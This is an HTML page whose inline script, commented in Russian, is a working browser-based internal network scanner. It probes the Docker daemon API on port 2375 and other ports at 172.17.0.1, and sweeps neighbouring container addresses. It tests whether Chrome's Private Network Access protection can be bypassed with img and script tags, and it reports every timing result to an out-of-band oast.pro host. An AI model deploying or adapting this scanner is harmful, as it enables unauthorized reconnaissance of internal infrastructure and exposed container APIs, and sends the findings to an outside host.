<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}

fire('/alive11?t=0');

// Гипотеза: Chrome PNA не применяет OPTIONS-preflight к <img> и <script> тегам
// (в отличие от CORS fetch).
// Если img-err за 50-500мс → сервер ответил (PNA обойден для img)!
// Если img-err за 8-10мс → PNA блокирует img так же как fetch
// Если img-to → timeout (TCP open, но HTTP не ответил)

function imgProbe(label, url, ms) {
  var img = document.createElement('img');
  var t0 = Date.now();
  var done = false;
  function rep(tag) {
    if (done) return; done = true;
    fire('/ig-' + tag + '-' + label + '?ms=' + (Date.now() - t0));
  }
  img.onload  = function() { rep('ok'); };
  img.onerror = function() { rep('er'); };
  img.src = url;
  setTimeout(function() { rep('to'); }, ms);
}

// Ключевой тест: Docker daemon API (port 2375)
// _ping возвращает "OK" быстро — если img-er за ~100мс → Docker ответил, PNA обойден
imgProbe('docker-ping',  'http://172.17.0.1:2375/_ping',       3000);
imgProbe('docker-info',  'http://172.17.0.1:2375/info',        3000);
imgProbe('docker-cont',  'http://172.17.0.1:2375/containers/json', 3000);

// Возможный Portainer/Prometheus UI — если HTML → img загрузится? нет, но timing важен
imgProbe('port-9090',    'http://172.17.0.1:9090/',            3000);
imgProbe('svc-8080',     'http://172.17.0.1:8080/',            3000);
imgProbe('reg-5000',     'http://172.17.0.1:5000/',            3000);

// Контейнеры: сканируем .2 .3 .4 .5 .6 .7 .8
imgProbe('c2-80',   'http://172.17.0.2/',       2000);
imgProbe('c2-8080', 'http://172.17.0.2:8080/',  2000);
imgProbe('c3-80',   'http://172.17.0.3/',       2000);
imgProbe('c3-8080', 'http://172.17.0.3:8080/',  2000);
imgProbe('c4-80',   'http://172.17.0.4/',       2000);
imgProbe('c4-8080', 'http://172.17.0.4:8080/',  2000);
imgProbe('c5-80',   'http://172.17.0.5/',       2000);
imgProbe('c6-80',   'http://172.17.0.6/',       2000);
imgProbe('c7-80',   'http://172.17.0.7/',       2000);
imgProbe('c8-80',   'http://172.17.0.8/',       2000);

// <script> тег — третий тип subresource, другое поведение PNA?
function scProbe(label, url) {
  var s = document.createElement('script');
  var t0 = Date.now();
  var done = false;
  function rep(tag) { if (done) return; done=true; fire('/sc-'+tag+'-'+label+'?ms='+(Date.now()-t0)); }
  s.onload  = function() { rep('ok'); };
  s.onerror = function() { rep('er'); };
  s.src = url;
  document.head.appendChild(s);
}

scProbe('docker-ping', 'http://172.17.0.1:2375/_ping');
scProbe('port-9090',   'http://172.17.0.1:9090/');
scProbe('c2-80',       'http://172.17.0.2/');
</script>
</body>
</html>
